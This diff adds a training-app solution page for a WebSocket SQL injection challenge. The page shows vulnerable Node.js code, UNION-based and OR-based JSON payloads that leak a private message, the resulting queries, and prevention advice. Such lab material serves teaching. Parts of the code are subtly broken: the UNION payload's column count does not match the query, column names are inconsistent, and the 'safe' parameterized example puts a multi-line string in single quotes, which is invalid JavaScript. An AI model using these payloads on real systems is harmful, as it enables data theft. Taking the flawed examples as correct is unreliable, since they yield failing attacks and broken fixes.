@@ -1,0 +1,234 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 16{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 16 - SQL Injection in WebSockets</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in a WebSocket-based API. Unlike traditional HTTP-based applications, WebSocket applications maintain a persistent connection between the client and server, allowing for real-time, bidirectional communication.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The application processes data received through WebSocket messages</li>
+                    <li>This data is used directly in SQL queries without proper validation or parameterization</li>
+                    <li>The application fails to properly sanitize or escape special characters in the WebSocket messages</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because WebSocket traffic is often less monitored than HTTP traffic, and traditional security tools may not inspect WebSocket communications.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the application processes WebSocket messages and uses them in SQL queries. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (Node.js with WebSocket and MySQL)
+wss.on('connection', (ws) => {
+  ws.on('message', (message) => {
+    try {
+      const data = JSON.parse(message);
+
+      if (data.action === 'getMessages') {
+        const roomId = data.roomId;
+        const limit = data.limit || 10;
+
+        // Vulnerable SQL query
+        const query = `SELECT message_id, user_id, content, timestamp
+                      FROM messages
+                      WHERE room_id = '${roomId}'
+                      ORDER BY timestamp DESC
+                      LIMIT ${limit}`;
+
+        db.query(query, (err, results) => {
+          if (err) {
+            ws.send(JSON.stringify({ error: 'Database error' }));
+          } else {
+            ws.send(JSON.stringify({ messages: results }));
+          }
+        });
+      }
+      // Other actions...
+    } catch (error) {
+      ws.send(JSON.stringify({ error: 'Invalid message format' }));
+    }
+  });
+});</code></pre>
+                <p>
+                    The vulnerability is in the direct use of <code>roomId</code> in the SQL query without proper sanitization or parameterization.
+                </p>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understand the WebSocket Message Format</h4>
+                <p>
+                    First, we need to understand the format of the WebSocket messages used by the application. Based on the challenge description and the default message template, the application uses JSON-formatted messages with an <code>action</code> field to specify the operation, and additional fields depending on the action.
+                </p>
+                <p>
+                    For the <code>getMessages</code> action, the message includes:
+                </p>
+                <ul>
+                    <li><code>action</code>: The operation to perform (e.g., "getMessages")</li>
+                    <li><code>roomId</code>: The ID of the room to get messages from</li>
+                    <li><code>limit</code>: The maximum number of messages to retrieve</li>
+                </ul>
+
+                <h4>2. Identify the Vulnerable Parameter</h4>
+                <p>
+                    Based on the challenge description and the message format, the <code>roomId</code> parameter is likely vulnerable to SQL injection. This parameter is probably used directly in a SQL query to filter messages by room.
+                </p>
+
+                <h4>3. Craft a SQL Injection Payload</h4>
+                <p>
+                    We can craft a payload that exploits the SQL injection vulnerability in the <code>roomId</code> parameter to access the private message with ID 999 in the admin room:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "getMessages",
+  "roomId": "general' UNION SELECT id, user_id, username, content, room_id, timestamp FROM messages WHERE id=999 -- ",
+  "limit": 10
+}</code></pre>
+                </div>
+                <p>
+                    When this WebSocket message is processed, the resulting SQL query will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT message_id, user_id, content, timestamp
+FROM messages
+WHERE room_id = 'general' UNION SELECT id, user_id, username, content, room_id, timestamp FROM messages WHERE id=999 -- '
+ORDER BY timestamp DESC
+LIMIT 10</code></pre>
+                <p>
+                    This query will return the message with ID 999, regardless of the room it belongs to. The <code>--</code> comments out the rest of the query, preventing syntax errors.
+                </p>
+
+                <h4>4. Alternative Approach: Using OR-based Injection</h4>
+                <p>
+                    We can also use an OR-based injection to retrieve the private message:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "getMessages",
+  "roomId": "general' OR id=999 OR room_id='",
+  "limit": 10
+}</code></pre>
+                </div>
+                <p>
+                    This will cause the application to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT message_id, user_id, content, timestamp
+FROM messages
+WHERE room_id = 'general' OR id=999 OR room_id=''
+ORDER BY timestamp DESC
+LIMIT 10</code></pre>
+                <p>
+                    This query will return messages from the general room as well as the message with ID 999.
+                </p>
+
+                <h4>5. Send the WebSocket Message</h4>
+                <p>
+                    To exploit the vulnerability, we need to send our crafted WebSocket message to the server. In the challenge interface, we can paste our payload into the WebSocket Message textarea and click the "Send Message" button.
+                </p>
+                <p>
+                    When the server processes our message, it will execute the injected SQL query and return the private message containing the flag.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    WebSocket-based SQL injection vulnerabilities are particularly relevant in:
+                </p>
+                <ul>
+                    <li><strong>Real-time Chat Applications</strong>: Many chat platforms use WebSockets for real-time messaging</li>
+                    <li><strong>Collaborative Editing Tools</strong>: Document collaboration tools often use WebSockets for real-time updates</li>
+                    <li><strong>Real-time Dashboards</strong>: Business intelligence dashboards use WebSockets for live data updates</li>
+                    <li><strong>Online Gaming Platforms</strong>: Multiplayer games use WebSockets for real-time communication</li>
+                </ul>
+                <p>
+                    The impact of these vulnerabilities can be severe:
+                </p>
+                <ul>
+                    <li>Unauthorized access to private messages and sensitive data</li>
+                    <li>Exposure of user credentials and personal information</li>
+                    <li>Manipulation of message content</li>
+                    <li>Complete compromise of the database</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent WebSocket-based SQL injection vulnerabilities, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (Node.js with WebSocket and MySQL)
+wss.on('connection', (ws) => {
+  ws.on('message', (message) => {
+    try {
+      const data = JSON.parse(message);
+
+      if (data.action === 'getMessages') {
+        const roomId = data.roomId;
+        const limit = parseInt(data.limit) || 10;
+
+        // Safe parameterized query
+        const query = 'SELECT message_id, user_id, content, timestamp
+                      FROM messages
+                      WHERE room_id = ?
+                      ORDER BY timestamp DESC
+                      LIMIT ?';
+
+        db.query(query, [roomId, limit], (err, results) => {
+          if (err) {
+            ws.send(JSON.stringify({ error: 'Database error' }));
+          } else {
+            ws.send(JSON.stringify({ messages: results }));
+          }
+        });
+      }
+      // Other actions...
+    } catch (error) {
+      ws.send(JSON.stringify({ error: 'Invalid message format' }));
+    }
+  });
+});</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate and Sanitize WebSocket Input</strong>:
+                        <ul>
+                            <li>Validate input types and formats</li>
+                            <li>Sanitize input to remove potentially malicious characters</li>
+                            <li>Use JSON Schema validation for structured messages</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper Access Controls</strong>:
+                        <ul>
+                            <li>Verify user permissions before executing database queries</li>
+                            <li>Implement role-based access control for WebSocket operations</li>
+                            <li>Use authentication tokens to validate WebSocket connections</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Monitor WebSocket Traffic</strong>:
+                        <ul>
+                            <li>Log WebSocket messages for security auditing</li>
+                            <li>Implement intrusion detection for WebSocket communications</li>
+                            <li>Use WebSocket-aware security tools</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level16') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
